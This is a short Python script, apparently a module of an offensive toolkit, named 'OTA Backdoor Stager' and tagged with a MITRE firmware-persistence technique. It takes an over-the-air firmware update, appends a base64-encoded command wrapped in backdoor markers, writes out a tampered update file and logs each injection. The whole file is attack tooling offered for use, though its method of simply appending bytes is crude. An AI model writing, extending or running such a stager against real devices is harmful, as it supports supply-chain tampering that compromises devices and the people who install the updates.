# modules/exploits/ota_backdoor_stager.py

import argparse
import os
import shutil
import base64
from datetime import datetime
import json

MITRE_TTP = "T1542.001"  # Pre-OS Boot - System Firmware

RESULTS_DIR = "results/ota_backdoor"
LOG_FILE = "results/exploit_logs.json"

def ensure_dirs():
    os.makedirs(RESULTS_DIR, exist_ok=True)
    os.makedirs("results", exist_ok=True)

def inject_backdoor(ota_path, output_path, command):
    if not os.path.exists(ota_path):
        raise FileNotFoundError(f"OTA file not found: {ota_path}")

    with open(ota_path, "rb") as f:
        firmware = f.read()

    backdoor_payload = b"\n#BACKDOOR_START\n" + base64.b64encode(command.encode()) + b"\n#BACKDOOR_END\n"
    new_firmware = firmware + backdoor_payload

    with open(output_path, "wb") as f:
        f.write(new_firmware)

    print(f"[âœ“] Backdoor appended to OTA binary: {output_path}")

    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "input_firmware": ota_path,
        "output_firmware": output_path,
        "cmd": command,
        "ttp": MITRE_TTP
    }

    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            logs = json.load(f)
    else:
        logs = []

    logs.append(log_entry)
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OTA Update Backdoor Stager")
    parser.add_argument("--ota", required=True, help="Input OTA firmware binary")
    parser.add_argument("--output", default="results/ota_backdoor/patched_ota.bin", help="Output path")
    parser.add_argument("--cmd", required=True, help="Command to stage in OTA (base64 encoded)")
    args = parser.parse_args()

    ensure_dirs()
    inject_backdoor(args.ota, args.output, args.cmd)
